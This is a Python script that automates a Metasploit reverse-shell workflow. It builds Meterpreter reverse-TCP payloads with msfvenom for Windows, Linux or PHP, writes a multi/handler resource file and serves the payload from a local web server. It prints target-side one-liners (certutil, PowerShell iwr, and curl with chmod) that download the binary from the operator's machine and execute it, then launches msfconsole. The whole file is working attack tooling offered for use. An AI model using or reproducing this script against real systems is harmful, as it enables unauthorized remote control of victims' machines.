import os
import socket
import psutil
import threading
import http.server
import socketserver

def get_best_interface():
    interfaces = psutil.net_if_addrs()
    candidates = []
    print("\n--- Network Interfaces ---")
    for name, addrs in interfaces.items():
        for addr in addrs:
            if addr.family == socket.AF_INET and not addr.address.startswith('127.'):
                candidates.append((name, addr.address))
                print(f"{len(candidates)}. {name} ({addr.address})")
    
    choice = int(input("\nSelect LHOST Index [Default 1]: ") or "1") - 1
    return candidates[choice][1]

def start_server(port):
    handler = http.server.SimpleHTTPRequestHandler
    # Suppress server logs to keep the terminal clean
    class QuietHandler(handler):
        def log_message(self, format, *args): return

    with socketserver.TCPServer(("", port), QuietHandler) as httpd:
        httpd.serve_forever()

def main():
    my_ip = get_best_interface()
    lport = input("[?] Listen Port [4444]: ") or "4444"
    
    print("\n--- 1. Select Base Platform ---")
    print("1. Windows x64 | 2. Windows x32 | 3. Linux x64 | 4. PHP")
    p_choice = input("Select [1-4]: ")

    # Defaults mapping
    defaults = {
        "1": ("windows/x64/meterpreter/reverse_tcp", "exe", "shell64.exe"),
        "2": ("windows/meterpreter/reverse_tcp", "exe", "shell32.exe"),
        "3": ("linux/x64/meterpreter/reverse_tcp", "elf", "shell.elf"),
        "4": ("php/meterpreter_reverse_tcp", "raw", "shell.php")
    }
    
    default_payload, fmt, filename = defaults.get(p_choice)

    # --- THE NEW CUSTOM PAYLOAD LOGIC ---
    print(f"\n[!] Default Payload: {default_payload}")
    custom = input("[?] Enter custom payload (or press ENTER for default): ").strip()
    
    final_payload = custom if custom else default_payload

    # 3. Generate Payload
    print(f"\n[*] Running msfvenom for {final_payload}...")
    os.system(f"msfvenom -p {final_payload} LHOST={my_ip} LPORT={lport} -f {fmt} -o {filename}")

    # 4. Create the Resource Script
    with open("handler.rc", "w") as f:
        f.write("jobs -K\n")
        f.write(f"use exploit/multi/handler\n")
        f.write(f"set PAYLOAD {final_payload}\n")
        f.write(f"set LHOST 0.0.0.0\n")
        f.write(f"set LPORT {lport}\n")
        f.write("set ExitOnSession false\n")
        f.write("exploit -j\n")

    # 5. Start Web Server in background
    threading.Thread(target=start_server, args=(8000,), daemon=True).start()

    # 6. Display Commands
    print("\n" + "="*70)
    print("TARGET DOWNLOAD COMMANDS".center(70))
    print("="*70)
    if "windows" in final_payload or "exe" in filename:
        print(f"Certutil: certutil -urlcache -f http://{my_ip}:8000/{filename} %TEMP%\\s.exe && %TEMP%\\s.exe")
        print(f"PShell:   iwr -uri http://{my_ip}:8000/{filename} -Outfile $env:TEMP\\s.exe; & $env:TEMP\\s.exe")
    elif "php" in final_payload:
        print(f"URL:      http://{my_ip}:8000/{filename}")
    else:
        print(f"Linux:    curl http://{my_ip}:8000/{filename} -o /tmp/s.elf && chmod +x /tmp/s.elf && /tmp/s.elf")
    print("="*70 + "\n")

    # 7. Launch MSF
    os.system("msfconsole -q -r handler.rc")

if __name__ == "__main__":
    main()
